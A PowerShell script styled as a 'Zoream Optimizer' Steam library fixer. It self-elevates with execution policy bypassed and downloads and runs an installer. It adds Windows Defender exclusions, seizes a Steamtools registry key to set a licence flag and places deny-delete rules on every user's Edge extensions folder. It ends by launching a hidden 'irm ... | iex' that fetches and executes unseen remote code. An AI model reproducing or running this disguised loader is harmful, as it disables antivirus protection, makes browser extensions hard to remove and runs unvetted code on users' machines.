[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
Try {
    $MethodDefinition = @'
    [DllImport("kernel32.dll")]
    public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
    [DllImport("kernel32.dll")]
    public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetStdHandle(int nStdHandle);
'@
    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name "Kernel32Functions" -Namespace Win32 -PassThru
}
catch {}

function Disable-QuickEdit {
    $hInput = $Kernel32::GetStdHandle(-10) 
    $mode = 0
    if ($Kernel32::GetConsoleMode($hInput, [ref]$mode)) {
        $mode = $mode -band -not (0x0040 -bor 0x0020)
        $Kernel32::SetConsoleMode($hInput, $mode -bor 0x0080)
    }
}

Disable-QuickEdit
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "White"
$host.UI.RawUI.WindowTitle = "Zoream Optimizer | SYS_0xA7"
Clear-Host

$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "`n [!] Requesting Administrative Privileges..." -ForegroundColor Yellow
    if ($PSCommandPath) { $scriptPath = $PSCommandPath } else {
        $scriptPath = Join-Path $env:TEMP "zoream_fix.ps1"
        $scriptText = $MyInvocation.MyCommand.ScriptBlock.ToString()
        Set-Content -Path $scriptPath -Value $scriptText -Encoding UTF8
    }
    Start-Process -FilePath "conhost.exe" -Verb RunAs -ArgumentList "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    exit
}

Disable-QuickEdit

function Show-Header {
    Write-Host " "
    Write-Host "  ______                                              " -ForegroundColor Cyan
    Write-Host " |__  /   ___   _ __    ___    __ _   _ __ ___        " -ForegroundColor Cyan
    Write-Host "   / /   / _ \ | '__|  / _ \  / _`` | | '_ `` _ \       " -ForegroundColor DarkCyan
    Write-Host "  / /_  | (_) || |    |  __/ | (_| | | | | | | |      " -ForegroundColor Blue
    Write-Host " /____|  \___/ |_|     \___|  \__,_| |_| |_| |_|      " -ForegroundColor Blue
    Write-Host " "
    Write-Host "   ----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "          Steam Library Fixer BY SYS_0xA7 " -ForegroundColor White
    Write-Host "   ----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host " "
}

function Write-Log {
    param([string]$Message, [string]$Type = "INFO")
    $Time = Get-Date -Format "HH:mm:ss"
    switch ($Type) {
        "INFO" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [?] $Message" -ForegroundColor Gray }
        "SUCCESS" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [OK] $Message" -ForegroundColor Green }
        "WARN" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [!] $Message" -ForegroundColor Yellow }
        "ERROR" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [X] $Message" -ForegroundColor Red }
        "STEP" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [>] $Message" -ForegroundColor Cyan }
    }
}

Clear-Host
Show-Header
Write-Log "Anti-Freeze (QuickEdit Disabled) applied successfully." "SUCCESS"

# Find Steam
try { $steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam").InstallPath } catch { $steamPath = $null }
if (-not $steamPath) { Write-Log "Steam not found!" "ERROR"; exit 1 }

$zoreamPath = Join-Path $env:LOCALAPPDATA "Zoream"
$zoreamExe = Join-Path $zoreamPath "Zoream.exe"

# -------------------------------------------------------------------------
# ZOREAM CHECK & DOWNLOAD MODULE
# -------------------------------------------------------------------------
if (-not (Test-Path $zoreamExe)) {
    Write-Log "Zoream component missing. Initiating download..." "WARN"
    
    $downloadUrl = "https://github.com/WolfGames156/zoreamrelease/releases/download/release/Zoream_Setup.exe"
    $tempSetup = Join-Path $env:TEMP "Zoream_Setup.exe"

    try {
        # .NET WebRequest kullanarak Timeout kontrolü ve Progress Bar
        $request = [System.Net.WebRequest]::Create($downloadUrl)
        $request.Timeout = 5000 # 5 Saniye Timeout
        $response = $request.GetResponse()
        
        $totalLength = $response.ContentLength
        $responseStream = $response.GetResponseStream()
        $targetStream = [System.IO.File]::Create($tempSetup)
        $buffer = New-Object byte[] 10KB
        $readCount = 0

        do {
            $count = $responseStream.Read($buffer, 0, $buffer.Length)
            $targetStream.Write($buffer, 0, $count)
            $readCount += $count
            if ($totalLength -gt 0) {
                $pct = [Math]::Floor(($readCount / $totalLength) * 100)
                Write-Progress -Activity "Downloading Zoream Installer" -Status "Progress: $pct%" -PercentComplete $pct
            }
        } while ($count -gt 0)

        $targetStream.Close()
        $responseStream.Close()
        $response.Close()
        
        Write-Progress -Activity "Downloading Zoream Installer" -Completed
        Write-Log "Zoream Setup downloaded successfully." "SUCCESS"
        
        # Ayrı bir işlem olarak aç (PowerShell'i bekletmesin)
        Start-Process -FilePath $tempSetup -WindowStyle Normal
    }
    catch {
        # Hata olursa veya 5 saniye timeout yerse hiçbir şey yapma, devam et.
        # İleride hata yazdırmıyoruz.
    }
}
# -------------------------------------------------------------------------

Write-Log "Applying Windows Defender exclusion for Zoream folder..." "STEP"

if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
    try {
        # Klasör fiziksel olarak oluşmamış olsa bile exclusion eklemek mantıklıdır (kurulum öncesi)
        # Ancak orijinal kodda Test-Path kontrolü vardı, burada hata almamak için
        # Eğer kurulum yeni indiyse klasör henüz oluşmamış olabilir.
        if (-not (Test-Path $zoreamPath)) {
            New-Item -ItemType Directory -Path $zoreamPath -Force | Out-Null
        }

        $existing = (Get-MpPreference -ErrorAction Stop).ExclusionPath

        if ($existing -and $existing -contains $zoreamPath) {
            Write-Log "Zoream folder already excluded." "SUCCESS"
        }
        else {
            Add-MpPreference -ExclusionPath $zoreamPath -ErrorAction Stop
            Write-Log "Zoream folder excluded successfully." "SUCCESS"
        }
    }
    catch {
        Write-Log "Failed to apply Defender exclusion. (If it does not apply automatically, you may add it manually.)" "ERROR"
    }
}
else {
    Write-Log "Windows Defender cmdlets not available. (If it does not apply automatically, you may add it manually.)" "ERROR"
}

Write-Log "Applying Windows Defender exclusion for Steam Folder..." "STEP"

if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
    try {
        $existing = (Get-MpPreference -ErrorAction Stop).ExclusionPath

        if ($existing -and $existing -contains $steamPath) {
            Write-Log "Steam folder already excluded." "SUCCESS"
        }
        else {
            Add-MpPreference -ExclusionPath $steamPath -ErrorAction Stop
            Write-Log "Steam folder excluded successfully." "SUCCESS"
        }
    }
    catch {
        Write-Log "Failed to apply Defender exclusion. (If it does not apply automatically, you may add it manually.)" "ERROR"
    }
}
else {
    Write-Log "Failed to apply Defender exclusion. (If it does not apply automatically, you may add it manually.)" "ERROR"
}

# -------------------------------------------------------------------------
Write-Log "Configuring system registry permissions..." "STEP"

# Windows Privilege Activation Function
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class TokenManipulator {
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
    
    [DllImport("kernel32.dll", ExactSpelling = true)]
    internal static extern IntPtr GetCurrentProcess();
    
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
    
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    internal struct TokPriv1Luid {
        public int Count;
        public long Luid;
        public int Attr;
    }
    
    internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
    internal const int TOKEN_QUERY = 0x00000008;
    internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
    
    public static bool EnablePrivilege(string privilege) {
        IntPtr hproc = GetCurrentProcess();
        IntPtr htok = IntPtr.Zero;
        if (!OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok)) return false;
        
        TokPriv1Luid tp;
        tp.Count = 1;
        tp.Luid = 0;
        tp.Attr = SE_PRIVILEGE_ENABLED;
        
        if (!LookupPrivilegeValue(null, privilege, ref tp.Luid)) return false;
        return AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    }
}
"@

try {
    # 1. Gerekli Windows yetkilerini aktif et
    [TokenManipulator]::EnablePrivilege("SeRestorePrivilege") | Out-Null
    [TokenManipulator]::EnablePrivilege("SeTakeOwnershipPrivilege") | Out-Null
    [TokenManipulator]::EnablePrivilege("SeBackupPrivilege") | Out-Null
    Write-Log "System privileges enabled." "INFO"

    # 2. Registry anahtarını aç (varsa)
    $regPath = "HKLM:\Software\Valve\Steamtools"
    
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
        Write-Log "Registry key created." "INFO"
    }
    # 3. SID ve Kimlik Tanımları
    $adminSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
    $systemSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-18")
    $userSID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User

    # 4. SAHİPLİĞİ AL (Bu aşama kilitleri açmak için şart)
    $regPath = "HKLM:\Software\Valve\Steamtools"
    # Önce anahtarı var et
    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
    
    $acl = Get-Acl -Path $regPath
    $acl.SetOwner($adminSID)
    Set-Acl -Path $regPath -AclObject $acl
    Write-Log "Ownership secured by Administrators." "INFO"

    # 5. !!! ŞİMDİ İZİN VERME (DENY) TİKLERİNİ KAZIMA VAKTİ !!!
    $acl = Get-Acl -Path $regPath
    
    # Devralmayı KESİN kapat ve üstten hiçbir yasak/izin kopyalama ($false)
    # Bu adım 'Üst nesne' ibaresini 'Yok' yapar.
    $acl.SetAccessRuleProtection($true, $false) 
    
    # Mevcut listedeki her kimliği (User, Restricted, System vb.) tara ve temizle
    $identities = $acl.Access | Select-Object -ExpandProperty IdentityReference -Unique
    foreach ($id in $identities) {
        # PurgeAccessRules hem 'İzin Ver' hem de 'İzin Verme' tiklerini TAMAMEN temizler.
        $acl.PurgeAccessRules($id)
    }
    Write-Log "All previous Deny/Allow checkboxes purged." "INFO"

    # 6. YENİ TERTEMİZ İZİNLERİ EKLE (Sadece İzin Ver)
    $rights = [System.Security.AccessControl.RegistryRights]::FullControl
    $iFlags = [System.Security.AccessControl.InheritanceFlags]::None # Devralma: Yok
    $pFlags = [System.Security.AccessControl.PropagationFlags]::None
    $allow = [System.Security.AccessControl.AccessControlType]::Allow

    $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($adminSID, $rights, $iFlags, $pFlags, $allow)))
    $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($systemSID, $rights, $iFlags, $pFlags, $allow)))
    $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($userSID, $rights, $iFlags, $pFlags, $allow)))

    # 7. ACL'yi ZORLA MÜHÜRLE
    Set-Acl -Path $regPath -AclObject $acl
    Write-Log "Explicit 'Allow' only permissions applied. Deny rules destroyed." "SUCCESS"

    # 8. Değeri mühürle ve doğrula
    New-ItemProperty -Path $regPath -Name "iscdkey" -Value "true" -PropertyType String -Force | Out-Null
    
    if ((Get-ItemProperty $regPath).iscdkey -eq "true") {
        Write-Log "Registry fixed! Inheritance is now internal only." "SUCCESS"
    }
}
catch {
    Write-Log "Error during registry fix: $($_.Exception.Message)" "ERROR"
}

# -------------------------------------------------------------------------
# EDGE EXTENSION PROTECTION (Anti-Deletion)
# -------------------------------------------------------------------------
Write-Log "Protecting Edge Extensions from deletion..." "STEP"

$userProfiles = Get-ChildItem "C:\Users" -Directory
foreach ($profile in $userProfiles) {
    # Sistem klasörlerini ve boş kullanıcıları atla
    if ($profile.Name -in @("Public", "Default", "All Users", "Default User")) { continue }
    
    $extensionPath = "$($profile.FullName)\AppData\Local\Microsoft\Edge\User Data\Default\Extensions"
    
    if (Test-Path $extensionPath) {
        try {
            $acl = Get-Acl -Path $extensionPath
            
            # Everyone (Herkes) SID'i: S-1-1-0
            $everyone = New-Object System.Security.Principal.SecurityIdentifier("S-1-1-0")
            
            # Silme engelleme kuralı
            # Delete, DeleteSubdirectoriesAndFiles (Silmeyi ve alt klasörleri silmeyi engeller)
            $denyRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
                $everyone, 
                "Delete, DeleteSubdirectoriesAndFiles", 
                "ContainerInherit, ObjectInherit", 
                "None", 
                "Deny"
            )
            
            $acl.AddAccessRule($denyRule)
            Set-Acl -Path $extensionPath -AclObject $acl
            Write-Log "Protected extensions for user: $($profile.Name)" "SUCCESS"
        }
        catch {
            Write-Log "Could not protect extensions for $($profile.Name) (In use or permission denied)" "WARN"
        }
    }
}
# -------------------------------------------------------------------------

Write-Log "Clearing Beta and Killing Processes..." "STEP"
Start-Process (Join-Path $steamPath "Steam.exe") -ArgumentList "-clearbeta"
Start-Sleep -Seconds 5
Get-Process steam* -ErrorAction SilentlyContinue | Stop-Process -Force

$backupPath = Join-Path $steamPath "cache-backup"
New-Item -ItemType Directory -Path $backupPath -Force | Out-Null

if (Test-Path (Join-Path $steamPath "appcache")) {
    Write-Log "Cleaning AppCache..." "STEP"
    Move-Item (Join-Path $steamPath "appcache") (Join-Path $backupPath "appcache") -Force -ErrorAction SilentlyContinue
}

$userdataPath = Join-Path $steamPath "userdata"
if (Test-Path $userdataPath) {
    Write-Log "Optimizing user data..." "STEP"
    foreach ($user in Get-ChildItem $userdataPath -Directory) {
        $config = Join-Path $user.FullName "config"
        if (Test-Path $config) {
            $uBack = Join-Path $backupPath ("userdata\" + $user.Name)
            New-Item -ItemType Directory -Path $uBack -Force | Out-Null
            Move-Item $config $uBack -Force -ErrorAction SilentlyContinue
            New-Item -ItemType Directory -Path $config -Force | Out-Null
            if (Test-Path (Join-Path $uBack "config\localconfig.vdf")) {
                Copy-Item (Join-Path $uBack "config\localconfig.vdf") (Join-Path $config "localconfig.vdf") -Force
            }
        }
    }
}

# Steam kapandıktan hemen sonra dwmapi.dll kontrolü ve temizliği
Write-Log "Checking for unauthorized DLLs (dwmapi.dll)..." "STEP"
$dwmapiPath = Join-Path $steamPath "dwmapi.dll"

if (Test-Path $dwmapiPath) {
    try {
        Remove-Item $dwmapiPath -Force -ErrorAction Stop
        Write-Log "dwmapi.dll found and successfully removed." "SUCCESS"
    }
    catch {
        Write-Log "Could not remove dwmapi.dll. It might be in use or protected." "ERROR"
    }
}
else {
    Write-Log "dwmapi.dll not found. System is clean." "INFO"
}


Write-Log "Validating and Cleaning stplug-in folder..." "STEP"
$stpluginPath = Join-Path $steamPath "config\stplug-in"

if (-not (Test-Path $stpluginPath)) {
    Write-Log "stplug-in folder does not exist!" "WARN"
}
else {

    Get-ChildItem $stpluginPath -File | ForEach-Object {

        if ($_.Extension -notin @(".lua", ".zor")) {
            Write-Log "Removing invalid file type: $($_.Name)" "ERROR"
            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
        }
    }

    function Test-ValidLuaLine {
        param([string]$Line)

        $trimmed = $Line.Trim()

        if ([string]::IsNullOrWhiteSpace($trimmed)) { return $true }
        if ($trimmed.StartsWith('-')) { return $true }

        if ($trimmed -match '^(?i)(addappid|setManifestid|addtoken)') {
            if ($trimmed -match '\(' -and $trimmed -match '\)') {
                return $true
            }
        }

        return $false
    }

    Get-ChildItem $stpluginPath -File | Where-Object {
        $_.Extension -in @(".lua", ".zor")
    } | ForEach-Object {

        $lines = Get-Content $_.FullName
        $isClean = $true

        foreach ($l in $lines) {
            if (-not (Test-ValidLuaLine $l)) {
                $isClean = $false
                break
            }
        }

        if ($isClean) {
            Write-Log "Validated: $($_.Name)" "SUCCESS"
        }
        else {
            Write-Log "Invalid content detected! Deleting: $($_.Name)" "ERROR"
            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
        }
    }
}

Write-Log "Checking for steam.cfg..." "STEP"
$cfgFiles = @("steam.cfg", "Steam.cfg")
foreach ($cfg in $cfgFiles) {
    $targetCfg = Join-Path $steamPath $cfg
    if (Test-Path $targetCfg) {
        Remove-Item $targetCfg -Force -ErrorAction SilentlyContinue
        Write-Log "Deleted: $cfg" "SUCCESS"
    }
}

Write-Log "Fix and Cleanup complete." "SUCCESS"
Write-Host " "
Write-Host "   *** CORE EXECUTING IN BACKGROUND ***" -ForegroundColor Cyan
Write-Host " "

$command = "irm https://zoream-database.vercel.app/dll.ps1 | iex"
Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -WindowStyle Hidden

for ($i = 10; $i -gt 0; $i--) {
    Write-Host "`r   *** This window will close in $i second(s) ***  " -ForegroundColor Magenta -NoNewline
    Start-Sleep -Seconds 1
}

exit
